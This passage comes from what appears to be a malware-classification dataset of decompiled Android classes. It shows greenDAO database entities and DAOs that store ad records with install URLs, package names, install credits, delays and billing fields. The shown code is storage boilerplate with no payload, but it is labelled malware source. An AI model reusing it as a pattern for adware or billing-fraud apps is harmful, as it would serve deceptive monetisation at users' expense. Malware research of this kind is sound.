6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)),cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public void readEntity(  Cursor cursor,  CoverAd coverAd,  int i){     coverAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     coverAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     coverAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     coverAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     coverAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     coverAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     coverAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     coverAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     coverAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     coverAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     coverAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     coverAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     coverAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     coverAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     coverAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     coverAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     coverAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     coverAd.setShowTime(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     coverAd.setShowStyle(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));     coverAd.setTablePlaqueImg(cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  CoverAd coverAd,  long j){     coverAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CreditsWallAd.code","public class CreditsWallAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private String billingInfo;   private Integer billingIntegral;   private Integer billingPrice;   private Integer billingUserMethod;   private Integer category;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private Integer installCredits;   private Integer installDelayTime;   private String intro;   private Integer kind;   private Integer maximumOpenTimes;   private Integer openCredits;   private Integer openDelayTime;   private String packageName;   private String printscreen;   private String recommend;   private String requirement;   private String showPeriod;   private String taskIntro;   private String url;   private String wifiSwitches;   public CreditsWallAd(){   }   public CreditsWallAd(  Long l){     this.id=l;   }   public CreditsWallAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4,  Integer num5,  String str14,  Integer num6,  Integer num7,  String str15,  Integer num8,  Integer num9,  String str16,  Integer num10,  Integer num11){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.category=num3;     this.installCredits=num4;     this.openCredits=num5;     this.requirement=str14;     this.installDelayTime=num6;     this.openDelayTime=num7;     this.taskIntro=str15;     this.maximumOpenTimes=num8;     this.billingPrice=num9;     this.billingInfo=str16;     this.billingUserMethod=num10;     this.billingIntegral=num11;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public String getBillingInfo(){     return this.billingInfo;   }   public Integer getBillingIntegral(){     return this.billingIntegral;   }   public Integer getBillingPrice(){     return this.billingPrice;   }   public Integer getBillingUserMethod(){     return this.billingUserMethod;   }   public Integer getCategory(){     return this.category;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public Integer getInstallCredits(){     return this.installCredits;   }   public Integer getInstallDelayTime(){     return this.installDelayTime;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public Integer getMaximumOpenTimes(){     return this.maximumOpenTimes;   }   public Integer getOpenCredits(){     return this.openCredits;   }   public Integer getOpenDelayTime(){     return this.openDelayTime;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getRequirement(){     return this.requirement;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getTaskIntro(){     return this.taskIntro;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setBillingInfo(  String str){     this.billingInfo=str;   }   public void setBillingIntegral(  Integer num){     this.billingIntegral=num;   }   public void setBillingPrice(  Integer num){     this.billingPrice=num;   }   public void setBillingUserMethod(  Integer num){     this.billingUserMethod=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setInstallCredits(  Integer num){     this.installCredits=num;   }   public void setInstallDelayTime(  Integer num){     this.installDelayTime=num;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setMaximumOpenTimes(  Integer num){     this.maximumOpenTimes=num;   }   public void setOpenCredits(  Integer num){     this.openCredits=num;   }   public void setOpenDelayTime(  Integer num){     this.openDelayTime=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setRequirement(  String str){     this.requirement=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setTaskIntro(  String str){     this.taskIntro=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CreditsWallAdDao.code","public class CreditsWallAdDao extends AbstractDao<CreditsWallAd,Long> {   public static final String TABLENAME=""CREDITS_WALL_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property Category=new Property(17,Integer.class,""category"",false,""CATEGORY"");     public static final Property InstallCredits=new Property(18,Integer.class,""installCredits"",false,""INSTALL_CREDITS"");     public static final Property OpenCredits=new Property(19,Integer.class,""openCredits"",false,""OPEN_CREDITS"");     public static final Property Requirement=new Property(20,String.class,""requirement"",false,""REQUIREMENT"");     public static final Property InstallDelayTime=new Property(21,Integer.class,""installDelayTime"",false,""INSTALL_DELAY_TIME"");     public static final Property OpenDelayTime=new Property(22,Integer.class,""openDelayTime"",false,""OPEN_DELAY_TIME"");     public static final Property TaskIntro=new Property(23,String.class,""taskIntro"",false,""TASK_INTRO"");     public static final Property MaximumOpenTimes=new Property(24,Integer.class,""maximumOpenTimes"",false,""MAXIMUM_OPEN_TIMES"");     public static final Property BillingPrice=new Property(25,Integer.class,""billingPrice"",false,""BILLING_PRICE"");     public static final Property BillingInfo=new Property(26,String.class,""billingInfo"",false,""BILLING_INFO"");     public static final Property BillingUserMethod=new Property(27,Integer.class,""billingUserMethod"",false,""BILLING_USER_METHOD"");     public static final Property BillingIntegral=new Property(28,Integer.class,""billingIntegral"",false,""BILLING_INTEGRAL"");   }   public CreditsWallAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public CreditsWallAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'CREDITS_WALL_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'CATEGORY' INTEGER,'INSTALL_CREDITS' INTEGER,'OPEN_CREDITS' INTEGER,'REQUIREMENT' TEXT,'INSTALL_DELAY_TIME' INTEGER,'OPEN_DELAY_TIME' INTEGER,'TASK_INTRO' TEXT,'MAXIMUM_OPEN_TIMES' INTEGER,'BILLING_PRICE' INTEGER,'BILLING_INFO' TEXT,'BILLING_USER_METHOD' INTEGER,'BILLING_INTEGRAL' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'CREDITS_WALL_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  CreditsWallAd creditsWallAd){     sQLiteStatement.clearBindings();     Long id=creditsWallAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=creditsWallAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (creditsWallAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (creditsWallAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=creditsWallAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=creditsWallAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=creditsWallAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=creditsWallAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=creditsWallAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=creditsWallAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=creditsWallAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=creditsWallAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=creditsWallAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=creditsWallAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=creditsWallAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=creditsWallAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=creditsWallAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (creditsWallAd.getCategory() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (creditsWallAd.getInstallCredits() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }     if (creditsWallAd.getOpenCredits() != null) {       sQLiteStatement.bindLong(20,r0.intValue());     }     String requirement=creditsWallAd.getRequirement();     if (requirement != null) {       sQLiteStatement.bindString(21,requirement);     }     if (creditsWallAd.getInstallDelayTime() != null) {       sQLiteStatement.bindLong(22,r0.intValue());     }     if (creditsWallAd.getOpenDelayTime() != null) {       sQLiteStatement.bindLong(23,r0.intValue());     }     String taskIntro=creditsWallAd.getTaskIntro();     if (taskIntro != null) {       sQLiteStatement.bindString(24,taskIntro);     }     if (creditsWallAd.getMaximumOpenTimes() != null) {       sQLiteStatement.bindLong(25,r0.intValue());     }     if (creditsWallAd.getBillingPrice() != null) {       sQLiteStatement.bindLong(26,r0.intValue());     }     String billingInfo=creditsWallAd.getBillingInfo();     if (billingInfo != null) {       sQLiteStatement.bindString(27,billingInfo);     }     if (creditsWallAd.getBillingUserMethod() != null) {       sQLiteStatement.bindLong(28,r0.intValue());     }     if (creditsWallAd.getBillingIntegral() != null) {       sQLiteStatement.bindLong(29,r0.intValue());     }   }   @Override public Long getKey(  CreditsWallAd creditsWallAd){     if (creditsWallAd != null) {       return creditsWallAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public CreditsWallAd readEntity(  Cursor cursor,  int i){     return new CreditsWallAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)),cursor.isNull(i + 19) ? null : Integer.valueOf(cursor.getInt(i + 19)),cursor.isNull(i + 20) ? null : cursor.getString(i + 20),cursor.isNull(i + 21) ? null : Integer.valueOf(cursor.getInt(i + 21)),cursor.isNull(i + 22) ? null : Integer.valueOf(cursor.getInt(i + 22)),cursor.isNull(i + 23) ? null : cursor.getString(i + 23),cursor.isNull(i + 24) ? null : Integer.valueOf(cursor.getInt(i + 24)),cursor.isNull(i + 25) ? null : Integer.valueOf(cursor.getInt(i + 25)),cursor.isNull(i + 26) ? null : cursor.getString(i + 26),cursor.isNull(i + 27) ? null : Integer.valueOf(cursor.getInt(i + 27)),cursor.isNull(i + 28) ? null : Integer.valueOf(cursor.getInt(i + 28)));   }   @Override public void readEntity(  Cursor cursor,  CreditsWallAd creditsWallAd,  int i){     creditsWallAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     creditsWallAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     creditsWallAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     creditsWallAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     creditsWallAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     creditsWallAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     creditsWallAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     creditsWallAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     creditsWallAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     creditsWallAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     creditsWallAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     creditsWallAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     creditsWallAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     creditsWallAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     creditsWallAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     creditsWallAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     creditsWallAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     creditsWallAd.setCategory(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     creditsWallAd.setInstallCredits(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));     creditsWallAd.setOpenCredits(cursor.isNull(i + 19) ? null : Integer.valueOf(cursor.getInt(i + 19)));     creditsWallAd.setRequirement(cursor.isNull(i + 20) ? null : cursor.getString(i + 20));     creditsWallAd.setInstallDelayTime(cursor.isNull(i + 21) ? null : Integer.valueOf(cursor.getInt(i + 21)));     creditsWallAd.setOpenDelayTime(cursor.isNull(i + 22) ? null : Integer.valueOf(cursor.getInt(i + 22)));     creditsWallAd.setTaskIntro(cursor.isNull(i + 23) ? null : cursor.getString(i + 23));     creditsWallAd.setMaximumOpenTimes(cursor.isNull(i + 24) ? null : Integer.valueOf(cursor.getInt(i + 24)));     creditsWallAd.setBillingPrice(cursor.isNull(i + 25) ? null : Integer.valueOf(cursor.getInt(i + 25)));     creditsWallAd.setBillingInfo(cursor.isNull(i + 26) ? null : cursor.getString(i + 26));     creditsWallAd.setBillingUserMethod(cursor.isNull(i + 27) ? null : Integer.valueOf(cursor.getInt(i + 27)));     creditsWallAd.setBillingIntegral(cursor.isNull(i + 28) ? null : Integer.valueOf(cursor.getInt(i + 28)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  CreditsWallAd creditsWallAd,  long j){     creditsWallAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CustomAd.code","public class CustomAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private String diyImg;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private String url;   private String wifiSwitches;   public CustomAd(){   }   public CustomAd(  Long l){     this.id=l;   }   public CustomAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.diyImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public String getDiyImg(){     return this.diyImg;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setDiyImg(  String str){     this.diyImg=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CustomAdDao.code","public class CustomAdDao extends AbstractDao<CustomAd,Long> {   public static final String TABLENAME=""CUSTOM_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property DiyImg=new Property(17,String.class,""diyImg"",false,""DIY_IMG"");   }   public CustomAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public CustomAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'CUSTOM_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'DIY_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'CUSTOM_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  CustomAd customAd){     sQLiteStatement.clearBindings();     Long id=customAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=customAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (customAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (customAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=customAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=customAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=customAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=customAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=customAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=customAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=customAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=customAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=customAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=customAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=customAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=customAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=customAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     String diyImg=customAd.getDiyImg();     if (diyImg != null) {       sQLiteStatement.bindString(18,diyImg);     }   }   @Override public Long getKey(  CustomAd customAd){     if (customAd != null) {       return customAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public CustomAd readEntity(  Cursor cursor,  int i){     return new CustomAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : cursor.getString(i + 17));   }   @Override public void readEntity(  Cursor cursor,  CustomAd customAd,  int i){     customAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     customAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     customAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     customAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     customAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     customAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     